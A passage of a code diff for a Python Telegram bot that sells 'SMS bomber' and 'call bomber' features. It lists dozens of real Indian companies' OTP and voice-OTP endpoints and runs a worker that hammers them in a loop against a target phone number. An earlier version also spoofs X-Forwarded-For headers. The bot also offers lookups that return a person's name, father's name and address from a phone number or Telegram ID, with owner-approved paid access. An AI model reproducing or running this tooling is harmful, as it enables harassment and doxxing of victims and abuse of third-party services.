-    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"},
-    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "Vyapar", "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}", "method": "GET", "headers": {}, "data": None},
-    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
-    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
-    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'},
-    {"name": "ConfirmTkt", "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}", "method": "GET", "headers": {}, "data": None},
-    {"name": "AstroSage", "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}", "method": "GET", "headers": {}, "data": None},
-    {"name": "CodFirm", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
-    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
-    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
-    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'},
-    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
-    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
-    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
-    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
-    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
-    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
-    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
-    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_no=%2B91{p}"},
-    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobilenumber={p}&otptype=register"},
-    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p}"},
-    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
-    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
-    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "Babaji Clubs", "url": "https://api.babajiclubs.com/api/users/login", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mob={p}&dev_id=123456789&app_id=com.babaji.galigame"},
+    {"name": "Swiggy", "url": "https://profile.swiggy.com/api/v3/app/request_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
 ]
 
-# ======================================================
-# 📞 CALL APIS
-# ======================================================
 CALL_APIS = [
-    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
-    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
     {"name": "Swiggy Voice", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
     {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=voice"},
-    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp"},
 ]
 
-
-# ======================================================
-# 💣 BOMBING WORKER
-# ======================================================
 def send_request(api, phone):
     try:
-        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"}
+        headers = {"User-Agent": "Mozilla/5.0"}
         headers.update(api.get("headers", {}))
-        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-        
         url = api["url"] if not callable(api["url"]) else api["url"](phone)
         data = api["data"](phone) if api["data"] and callable(api["data"]) else api["data"]
         
         if api["method"] == "POST":
-            if "application/x-www-form-urlencoded" in str(headers.get("Content-Type", "")):
-                response = requests.post(url, data=data, headers=headers, timeout=3)
-            else:
-                if data and isinstance(data, str):
-                    try:
-                        response = requests.post(url, json=json.loads(data), headers=headers, timeout=3)
-                    except:
-                        response = requests.post(url, data=data, headers=headers, timeout=3)
-                else:
-                    response = requests.post(url, headers=headers, timeout=3)
+            response = requests.post(url, json=json.loads(data), headers=headers, timeout=3)
         else:
             response = requests.get(url, headers=headers, timeout=3)
-        
         return response.status_code in [200, 201, 202, 204]
     except:
         return False
 
 def bombing_worker(chat_id, phone, bomb_type):
-    bombing_active[chat_id] = True
-    bombing_stats[chat_id] = {"success": 0, "failed": 0, "total": 0, "type": bomb_type, "phone": phone}
-    
+    BOMBING_ACTIVE[chat_id] = True
+    BOMBING_STATS[chat_id] = {"success": 0, "failed": 0, "total": 0}
     apis = CALL_APIS if bomb_type == "call" else SMS_APIS
     
-    while bombing_active.get(chat_id, False):
+    while BOMBING_ACTIVE.get(chat_id, False):
         for api in apis:
-            if not bombing_active.get(chat_id, False):
+            if not BOMBING_ACTIVE.get(chat_id, False):
                 break
             result = send_request(api, phone)
-            bombing_stats[chat_id]["total"] += 1
+            BOMBING_STATS[chat_id]["total"] += 1
             if result:
-                bombing_stats[chat_id]["success"] += 1
+                BOMBING_STATS[chat_id]["success"] += 1
             else:
-                bombing_stats[chat_id]["failed"] += 1
-        time.sleep(0.01)
+                BOMBING_STATS[chat_id]["failed"] += 1
+        time.sleep(0.3)
 
-# ======================================================
-# 📢 BROADCAST SYSTEM (MULTIPLE OWNER SUPPORT)
-# ======================================================
-
-def is_owner(user_id):
-    return str(user_id) in OWNER_IDS
-
-
-def broadcast_to_all(message, owner_id):
-
-    # ✅ OWNER CHECK (MULTIPLE)
-    if not is_owner(owner_id):
-        return 0, 0
-
-    success = 0
-    fail = 0
-
-    broadcast_msg = get_broadcast_message(message)
-
-    for user_id in list(verified_users):
-        try:
-            send_message(int(user_id), broadcast_msg)
-            success += 1
-        except:
-            fail += 1
-
-        time.sleep(0.1)  # anti-spam / anti-ban delay
-
-    return success, fail
-# ======================================================
-# 🤖 MESSAGE HANDLER
-# ======================================================
-def handle_message(chat_id, text, username, first_name, user_states):
-
-    # 🔐 OWNER CHECK (MULTIPLE OWNERS)
-    if text.startswith("/broadcast "):
-
-        if str(chat_id) not in OWNER_IDS:
-            send_message(chat_id, "❌ You are not authorized to broadcast!", main_keyboard())
-            return None
-
-        msg = text.replace("/broadcast ", "").strip()
-        success, fail = broadcast_to_all(msg, chat_id)
-
-        send_message(
-            chat_id,
-            f"✅ Broadcast Complete!\n\n📨 Success: {success}\n❌ Failed: {fail}",
-            main_keyboard()
-        )
-        return None
-    
-    if text == "/start":
-        send_message(chat_id, get_main_menu_message(first_name), main_keyboard())
-    
-    elif text == "📞 NUMBER LOOKUP":
-        send_message(chat_id, "📞 Send target number (10 digits):")
-        return "awaiting_number"
-    
-    elif text == "🆔 TG ID TO NUMBER":
-        send_message(chat_id, "🆔 Send Telegram User ID (numeric only):")
-        return "awaiting_tgid"
-    
-    elif text == "💣 SMS PRANK":
-        send_message(chat_id, "💣 Send target number (10 digits) for SMS BOMBING\n\n⚠️ Press STOP BOMB to stop")
-        return "awaiting_sms_bomb"
-    
-    elif text == "📞 CALL PRANK":
-        send_message(chat_id, "📞 Send target number (10 digits) for CALL BOMBING\n\n⚠️ Press STOP BOMB to stop")
-        return "awaiting_call_bomb"
-    
-    elif text == "📊 STATS":
-        total_success = sum(s.get('success', 0) for s in bombing_stats.values())
-        send_message(chat_id, get_stats_message(len(verified_users), len(bombing_active), total_success), main_keyboard())
-    
-    elif text == "🛑 STOP BOMB":
-        if chat_id in bombing_active and bombing_active[chat_id]:
-            bombing_active[chat_id] = False
-            time.sleep(1)
-            stats = bombing_stats.get(chat_id, {"success": 0, "failed": 0, "total": 0})
-            send_message(chat_id, get_bomb_stop_message(stats['success'], stats['failed'], stats['total']), main_keyboard())
-            del bombing_active[chat_id]
-            if chat_id in bombing_stats:
-                del bombing_stats[chat_id]
-        else:
-            send_message(chat_id, "❌ No active bombing session!", main_keyboard())
-    
-    elif text.isdigit() and len(text) >= 10:
-        num = text[:10]
-        
-        send_message(chat_id, "🔍 FETCHING INFORMATION...")
-        
-        if num in cache:
-            data = cache[num]
-        else:
-            data = number_lookup_api(num)
-            if not data:
-                data = number_lookup_backup(num)
-            cache[num] = data
-        
-        if data and isinstance(data, list) and len(data) > 0:
-            send_message(chat_id, get_number_lookup_result(num, data), main_keyboard())
-        else:
-            send_message(chat_id, f"❌ No data found for {num}", main_keyboard())
-    
-    return None
-# ======================================================
-# 🚀 MAIN FUNCTION
-# ======================================================
+# ========= MAIN FUNCTION =========
 def main():
     load_data()
     
-    print("=" * 50)
-    print("🔥 BOT STARTED SUCCESSFULLY 🔥")
-    print("=" * 50)
+    print("╔════════════════════════════════════════╗")
+    print("║     🔥 BOT STARTED SUCCESSFULLY 🔥      ║")
+    print("╠════════════════════════════════════════╣")
+    print(f"║  OWNER: {OWNER_USERNAME}")
+    print(f"║  OWNER ID: {OWNER_ID}")
+    print(f"║  USERS: {len(USERS)}")
+    print(f"║  PENDING: {len(PENDING_USERS)}")
+    print("╠════════════════════════════════════════╣")
+    print("║  🚀 BOT RUNNING...                     ║")
+    print("╚════════════════════════════════════════╝")
     
-    # ✅ FIXED (OWNER_ID ➝ OWNER_IDS)
-    print(f"👑 OWNER IDs: {', '.join(OWNER_IDS)}")
-    
-    print(f"✅ VERIFIED USERS: {len(verified_users)}")
-    print(f"💣 SMS APIs: {len(SMS_APIS)}")
-    print(f"📞 CALL APIs: {len(CALL_APIS)}")
-    print(f"📢 CHANNEL: {CHANNEL_LINK}")
-    print("=" * 50)
-    print("🚀 BOT IS RUNNING...")
-    print("=" * 50)
-    
-    last_update_id = 0
     user_states = {}
+    last_update_id = 0
+    temp_data = {}
     
     while True:
         try:
@@ -630,117 +476,321 @@ def main():
             
             for update in updates:
                 last_update_id = update.get("update_id")
-                message = update.get("message")
+                
+                # Handle callbacks
                 callback = update.get("callback_query")
-                
-                # Handle callback (VERIFY button)
                 if callback:
-                    chat_id = callback.get("message", {}).get("chat", {}).get("id")
+                    chat_id = callback.get("from", {}).get("id")
                     message_id = callback.get("message", {}).get("message_id")
-                    data = callback.get("data", "")
+                    callback_data = callback.get("data", "")
+                    callback_id = callback.get("id")
                     
-                    if data == "verify":
-                        if check_user_in_channel(chat_id):
-                            verified_users.add(chat_id)
+                    try:
+                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
+                                     data={"callback_query_id": callback_id})
+                    except:
+                        pass
+                    
+                    if callback_data == "check_verify":
+                        if str(chat_id) not in PENDING_USERS:
+                            user_info = get_user_info(chat_id)
+                            fn = user_info.get('first_name', 'User') if user_info else 'User'
+                            un = user_info.get('username', '') if user_info else ''
+                            send_verification_to_owner(chat_id, un, fn)
+                            PENDING_USERS[str(chat_id)] = {"first_name": fn, "username": un, "timestamp": time.time()}
                             save_data()
-                            edit_message(chat_id, message_id, get_main_menu_message("User"), main_keyboard())
+                            send_telegram_message(chat_id, "✅ Request sent to owner!")
+                            try:
+                                edit_telegram_message(chat_id, message_id, "✅ Request sent! Wait for owner.")
+                            except:
+                                pass
                         else:
-                            edit_message(
-                                chat_id,
-                                message_id,
-                                get_welcome_message("User") + "\n\n❌ Verification Failed! Please join channel first.",
-                                verify_keyboard()
-                            )
+                            send_telegram_message(chat_id, "⏳ Request already pending!")
+                    
+                    elif callback_data.startswith("accept_"):
+                        if chat_id == OWNER_ID:
+                            target_id = int(callback_data.split("_")[1])
+                            temp_data["accept_user"] = target_id
+                            send_telegram_message(chat_id, f"Select days for user {target_id}:", days_keyboard(target_id))
+                            try:
+                                edit_telegram_message(chat_id, message_id, f"📅 Select days for user {target_id}")
+                            except:
+                                pass
+                    
+                    elif callback_data.startswith("decline_"):
+                        if chat_id == OWNER_ID:
+                            target_id = int(callback_data.split("_")[1])
+                            decline_user(target_id)
+                            try:
+                                edit_telegram_message(chat_id, message_id, f"❌ User {target_id} declined!")
+                            except:
+                                pass
+                    
+                    elif callback_data.startswith("days_"):
+                        if chat_id == OWNER_ID:
+                            parts = callback_data.split("_")
+                            days = int(parts[1])
+                            target_id = int(parts[2])
+                            accept_user_with_expiry(target_id, days)
+                            try:
+                                edit_telegram_message(chat_id, message_id, f"✅ User {target_id} verified for {days} days!")
+                            except:
+                                pass
+                    
+                    continue
                 
-                # Handle text messages
-                elif message:
+                # Handle messages
+                message = update.get("message")
+                if message:
                     chat_id = message.get("chat", {}).get("id")
                     text = message.get("text", "")
                     username = message.get("from", {}).get("username", "")
                     first_name = message.get("from", {}).get("first_name", "User")
                     
+                    if not chat_id:
+                        continue
+                    
+                    # Cancel command
+                    if text == "/cancel":
+                        if chat_id in user_states:
+                            del user_states[chat_id]
+                        send_telegram_message(chat_id, "❌ Cancelled!")
+                        continue
+                    
                     state = user_states.get(chat_id, "")
                     
-                    # =========================
-                    # ✅ STATE HANDLING
-                    # =========================
-                    
-                    if state == "awaiting_sms_bomb" and text.isdigit() and len(text) == 10:
-                        if chat_id in bombing_active and bombing_active[chat_id]:
-                            send_message(chat_id, "❌ Already bombing! Use STOP BOMB first.")
-                            user_states[chat_id] = ""
+                    # Check verification for non-owner
+                    if not is_verified(chat_id):
+                        if text == "/start":
+                            send_verification_panel(chat_id)
                             continue
-                        
-                        send_message(chat_id, get_bomb_start_message("sms", text, len(SMS_APIS)))
-                        
-                        thread = threading.Thread(target=bombing_worker, args=(chat_id, text, "sms"))
-                        thread.daemon = True
-                        thread.start()
-                        
-                        user_states[chat_id] = ""
+                        elif text == "✅ VERIFY ME":
+                            if str(chat_id) in PENDING_USERS:
+                                send_telegram_message(chat_id, "⏳ Request already pending!")
+                                continue
+                            user_info = get_user_info(chat_id)
+                            fn = user_info.get('first_name', first_name) if user_info else first_name
+                            un = user_info.get('username', username) if user_info else username
+                            send_verification_to_owner(chat_id, un, fn)
+                            PENDING_USERS[str(chat_id)] = {"username": un, "first_name": fn, "timestamp": time.time()}
+                            save_data()
+                            send_telegram_message(chat_id, "✅ Request sent to owner!")
+                            continue
+                        elif text == "📢 CHANNEL":
+                            send_telegram_message(chat_id, f"🔗 {CHANNEL_LINK}")
+                            continue
+                        elif text != "/start":
+                            send_verification_panel(chat_id)
+                            continue
+                    
+                    # BROADCAST (Owner only)
+                    if state == "awaiting_broadcast" and chat_id == OWNER_ID:
+                        if text:
+                            broadcast_to_users(chat_id, text)
+                            del user_states[chat_id]
                         continue
                     
-                    elif state == "awaiting_call_bomb" and text.isdigit() and len(text) == 10:
-                        if chat_id in bombing_active and bombing_active[chat_id]:
-                            send_message(chat_id, "❌ Already bombing! Use STOP BOMB first.")
-                            user_states[chat_id] = ""
-                            continue
-                        
-                        send_message(chat_id, get_bomb_start_message("call", text, len(CALL_APIS)))
-                        
-                        thread = threading.Thread(target=bombing_worker, args=(chat_id, text, "call"))
-                        thread.daemon = True
-                        thread.start()
-                        
-                        user_states[chat_id] = ""
+                    # ADD USER - Stage 1 (Owner only)
+                    if state == "awaiting_add_user" and chat_id == OWNER_ID:
+                        if text.isdigit():
+                            temp_data["add_user_id"] = int(text)
+                            send_telegram_message(chat_id, f"Select days for user {text}:", days_keyboard(int(text)))
+                            del user_states[chat_id]
+                        else:
+                            send_telegram_message(chat_id, "❌ Send numeric ID only!")
                         continue
                     
-                    elif state == "awaiting_tgid" and text.isdigit():
-                        send_message(chat_id, "🆔 FETCHING PHONE NUMBER...")
+                    # REMOVE USER (Owner only)
+                    if state == "awaiting_remove_user" and chat_id == OWNER_ID:
+                        if text.isdigit():
+                            remove_user_direct(chat_id, int(text))
+                            del user_states[chat_id]
+                        else:
+                            send_telegram_message(chat_id, "❌ Send numeric ID only!")
+                        continue
+                    
+                    # TG ID TO NUMBER
+                    if state == "awaiting_tgid" and text.isdigit():
+                        send_telegram_message(chat_id, "🆔 Fetching...")
                         result = tgid_to_number_api(text)
-                        
                         if result:
-                            send_message(
-                                chat_id,
-                                get_tgid_result(text, result.get('number'), result.get('country', 'India')),
-                                main_keyboard()
-                            )
+                            send_telegram_message(chat_id, f"🆔 TG ID TO NUMBER\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nID: {text}\n📞 +{result.get('country_code', '91')}{result.get('number')}\n🌍 {result.get('country', 'India')}")
                         else:
-                            send_message(chat_id, f"❌ Failed to fetch number for ID: {text}", main_keyboard())
-                        
+                            send_telegram_message(chat_id, f"❌ No number for {text}")
                         user_states[chat_id] = ""
                         continue
                     
-                    elif state == "awaiting_number" and text.isdigit() and len(text) == 10:
-                        send_message(chat_id, "🔍 FETCHING INFORMATION...")
-                        
-                        if text in cache:
-                            data = cache[text]
-                        else:
-                            data = number_lookup_api(text)
-                            if not data:
-                                data = number_lookup_backup(text)
-                            cache[text] = data
-                        
-                        if data and isinstance(data, list) and len(data) > 0:
-                            send_message(chat_id, get_number_lookup_result(text, data), main_keyboard())
-                        else:
-                            send_message(chat_id, f"❌ No data found for {text}", main_keyboard())
-                        
-                        user_states[chat_id] = ""
-                        continue
-                    
-                    # =========================
-                    # NORMAL FLOW
-                    # =========================
-                    
-                    else:
-                        new_state = handle_message(chat_id, text, username, first_name, user_states)
-                        
-                        if new_state:
-                            user_states[chat_id] = new_state
-                        elif state:
+                    # NUMBER LOOKUP
+                    if state == "awaiting_number" and text.isdigit() and len(text) >= 10:
+                        num = text[:10]
+                        if num == PROTECTED_NUMBER:
+                            send_telegram_message(chat_id, WARNING_MSG)
                             user_states[chat_id] = ""
+                            continue
+                        
+                        send_telegram_message(chat_id, "🔍 Searching...")
+                        data = number_lookup_api(num)
+                        if not data:
+                            data = number_lookup_backup(num)
+                        
+                        if data and data != "PROTECTED" and isinstance(data, list) and len(data) > 0:
+                            result = f"📞 NUMBER LOOKUP\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nTarget: {num}\nRecords: {len(data)}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                            for i, r in enumerate(data, 1):
+                                result += f"\n📋 RECORD {i}\nMobile: {r.get('MOBILE', 'N/A')}\nName: {r.get('NAME', 'N/A')}"
+                                if r.get('fname'):
+                                    result += f"\nFather: {r.get('fname')}"
+                                addr = r.get('ADDRESS', 'N/A')
+                                if addr != 'N/A':
+                                    result += f"\nAddress: {addr[:60]}"
+                                result += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
+                            send_telegram_message(chat_id, result[:4000])
+                        else:
+                            send_telegram_message(chat_id, f"❌ No data for {num}")
+                        user_states[chat_id] = ""
+                        continue
+                    
+                    # SMS BOMBER
+                    if state == "awaiting_sms" and text.isdigit() and len(text) == 10:
+                        if text == PROTECTED_NUMBER:
+                            send_telegram_message(chat_id, WARNING_MSG)
+                            user_states[chat_id] = ""
+                            continue
+                        
+                        if chat_id in BOMBING_ACTIVE:
+                            send_telegram_message(chat_id, "❌ Already bombing!")
+                            user_states[chat_id] = ""
+                            continue
+                        
+                        send_telegram_message(chat_id, f"💣 SMS BOMBING STARTED\nTarget: +91{text}\nPress 🛑 STOP to stop")
+                        threading.Thread(target=bombing_worker, args=(chat_id, text, "sms"), daemon=True).start()
+                        user_states[chat_id] = ""
+                        continue
+                    
+                    # CALL BOMBER
+                    if state == "awaiting_call" and text.isdigit() and len(text) == 10:
+                        if text == PROTECTED_NUMBER:
+                            send_telegram_message(chat_id, WARNING_MSG)
+                            user_states[chat_id] = ""
+                            continue
+                        
+                        if chat_id in BOMBING_ACTIVE:
+                            send_telegram_message(chat_id, "❌ Already bombing!")
+                            user_states[chat_id] = ""
+                            continue
+                        
+                        send_telegram_message(chat_id, f"📞 CALL BOMBING STARTED\nTarget: +91{text}\nPress 🛑 STOP to stop")
+                        threading.Thread(target=bombing_worker, args=(chat_id, text, "call"), daemon=True).start()
+                        user_states[chat_id] = ""
+                        continue
+                    
+                    # ========= VERIFIED USER MENU =========
+                    if text == "/start":
+                        USERS.add(chat_id)
+                        save_data()
+                        
+                        days_left = get_days_left(chat_id)
+                        days_text = f"\n📅 Days left: {days_left}" if days_left > 0 else ""
+                        
+                        welcome_text = f"""🔥 WELCOME {first_name} 🔥{days_text}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+📞 NUMBER LOOKUP
+🆔 TG ID TO NUMBER
+💣 SMS BOMBER
+📞 CALL BOMBER
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Use buttons below!"""
+                        
+                        if chat_id == OWNER_ID:
+                            send_telegram_message(chat_id, welcome_text, owner_keyboard())
+                        else:
+                            send_telegram_message(chat_id, welcome_text, main_keyboard())
+                        continue
+                    
+                    # Owner commands
+                    if chat_id == OWNER_ID:
+                        if text == "👑 PENDING":
+                            if PENDING_USERS:
+                                msg = "🔔 PENDING REQUESTS\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                for uid, data in PENDING_USERS.items():
+                                    msg += f"🆔 {uid}\n👤 {data.get('first_name', 'Unknown')}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                send_telegram_message(chat_id, msg)
+                            else:
+                                send_telegram_message(chat_id, "✅ No pending requests!")
+                            continue
+                        
+                        if text == "👑 ADD USER":
+                            send_telegram_message(chat_id, "Send user ID to add:")
+                            user_states[chat_id] = "awaiting_add_user"
+                            continue
+                        
+                        if text == "👑 REMOVE USER":
+                            send_telegram_message(chat_id, "Send user ID to remove:")
+                            user_states[chat_id] = "awaiting_remove_user"
+                            continue
+                        
+                        if text == "👑 TOTAL USERS":
+                            result = get_total_users_list(chat_id)
+                            send_telegram_message(chat_id, result)
+                            continue
+                        
+                        if text == "📢 BROADCAST":
+                            send_telegram_message(chat_id, "📢 Send message to broadcast:")
+                            user_states[chat_id] = "awaiting_broadcast"
+                            continue
+                    
+                    # Common commands for all verified users
+                    if text == "📞 NUMBER LOOKUP":
+                        send_telegram_message(chat_id, "📞 Send number (10 digits):")
+                        user_states[chat_id] = "awaiting_number"
+                        continue
+                    
+                    if text == "🆔 TG ID TO NUMBER":
+                        send_telegram_message(chat_id, "🆔 Send Telegram ID:")
+                        user_states[chat_id] = "awaiting_tgid"
+                        continue
+                    
+                    if text == "💣 SMS BOMBER":
+                        send_telegram_message(chat_id, "💣 Send target number (10 digits):\nPress 🛑 STOP to stop")
+                        user_states[chat_id] = "awaiting_sms"
+                        continue
+                    
+                    if text == "📞 CALL BOMBER":
+                        send_telegram_message(chat_id, "📞 Send target number (10 digits):\nPress 🛑 STOP to stop")
+                        user_states[chat_id] = "awaiting_call"
+                        continue
+                    
+                    if text == "📢 CHANNEL":
+                        send_telegram_message(chat_id, f"🔗 {CHANNEL_LINK}")
+                        continue
+                    
+                    if text == "📊 STATS":
+                        active_bomb = len([x for x in BOMBING_ACTIVE.values() if x])
+                        stats = f"📊 STATS\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👥 Users: {len(USERS)}\n🎯 Active bombs: {active_bomb}\n💣 SMS APIs: {len(SMS_APIS)}\n📞 Call APIs: {len(CALL_APIS)}"
+                        send_telegram_message(chat_id, stats)
+                        continue
+                    
+                    if text == "🛑 STOP BOMB":
+                        if chat_id in BOMBING_ACTIVE:
+                            BOMBING_ACTIVE[chat_id] = False
+                            stats = BOMBING_STATS.get(chat_id, {})
+                            send_telegram_message(chat_id, f"🛑 STOPPED\n✅ {stats.get('success',0)}\n❌ {stats.get('failed',0)}\n📈 {stats.get('total',0)}")
+                            del BOMBING_ACTIVE[chat_id]
+                        else:
+                            send_telegram_message(chat_id, "❌ No active bomb!")
+                        continue
+                    
+                    if text == "✅ VERIFY ME":
+                        if str(chat_id) in PENDING_USERS:
+                            send_telegram_message(chat_id, "⏳ Request already pending!")
+                            continue
+                        user_info = get_user_info(chat_id)
+                        fn = user_info.get('first_name', first_name) if user_info else first_name
+                        un = user_info.get('username', username) if user_info else username
+                        send_verification_to_owner(chat_id, un, fn)
+                        PENDING_USERS[str(chat_id)] = {"username": un, "first_name": fn, "timestamp": time.time()}
+                        save_data()
